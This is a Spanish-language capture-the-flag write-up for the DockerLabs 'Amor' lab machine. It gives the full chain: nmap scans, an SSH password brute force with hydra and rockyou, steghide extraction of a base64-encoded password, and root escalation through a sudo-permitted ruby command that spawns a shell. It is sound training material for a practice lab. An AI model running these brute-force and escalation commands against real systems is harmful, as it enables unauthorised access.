# Máquina Amor

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

------------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p22,80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e72b68b5f7c2364dc1521325fce400a (ECDSA)
|_  256 058aa7270f88b97084ec6d33dcce096f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accedemos a la web para inspeccionarla:

![Pasted image 20240427175903](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/404422b7-1efc-4b05-b538-c53b5950968c)

Encontramos información importante como un par de usuarios, **carlota** y **juan**. Y que hay usuarios en el sistema con contraseñas débiles.

--------------
## Explotación

Aplicamos fuerza bruta con **hydra** sobre los usuarios:

```shell
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
-------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```

Encontramos las credenciales de carlota -> **carlota:babygirl**
Accedemos por ssh:

```shell
ssh carlota@172.17.0.2
```

Estamos dentro !

------------------------------
## Escalada de privilegios

En el directorio **/home/Desktop/fotos/vacaciones** de Carlota encontramos una imágen.

Nos la descargaremos para verla. Podemos usar **scp**:

```shell
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/albertomarcostic/Desktop/DockerLabs/Amor/content
```

Veremos si tiene algo oculto con la herramienta **steghide**:

```shell
steghide --extract -sf imagen.jpg
--------------------------------------
datos extrados e/"secret.txt".
```

Obtenemos un **secret.txt** con la siguiente información -> **ZXNsYWNhc2FkZXBpbnlwb24=**

Tiene pinta de **base64** así que lo decoficamos:

```shell
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
-------------------------------------------------------
eslacasadepinypon
```

Usaremos esta información como contraseña para intentar migrar a otro usuario o convertirnos en **root**:

```shell
su oscar
```

Conseguimos migrar al usuario **oscar**.
Ejecutamos **sudo -l** para ver si podemos ejecutar algo como otro usuario o como **root**:

```shell
sudo -l
------------------------------------------------
User oscar may run the following commands on 6ba86e9dc48a:
    (ALL) NOPASSWD: /usr/bin/ruby
```


Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins]()

```shell
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo en la máquina.

```shell
cat /root/Desktop/THX.txt
-------------------------------
Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.
```
